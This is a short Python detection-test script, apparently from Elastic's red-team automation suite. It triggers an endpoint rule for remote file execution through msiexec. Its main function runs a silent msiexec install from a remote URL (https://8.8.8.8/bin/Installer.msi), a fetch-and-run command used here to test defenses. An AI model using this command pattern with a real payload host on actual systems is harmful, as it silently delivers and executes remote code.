# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common

PLATFORMS = ["windows"]
TRIGGERED_RULES = {
    "SIEM": [],
    "ENDPOINT": [
        {
            "rule_name": "Remote File Execution via MSIEXEC",
            "rule_id": "8ba98e28-d83e-451e-8df7-f0964f7e69b6",
        }
    ],
}
TACTICS = ["TA0005"]
RTA_ID = "de245f02-8614-4fdd-b6e4-e845bbadd056"


@common.requires_os(PLATFORMS)
def main():

    # Execute command
    common.log("Trying to fetch remote non-existent MSI")
    common.execute(
        ["msiexec.exe", "/q", "/i", "https://8.8.8.8/bin/Installer.msi"],
        timeout=5,
        kill=True,
    )


if __name__ == "__main__":
    exit(main())
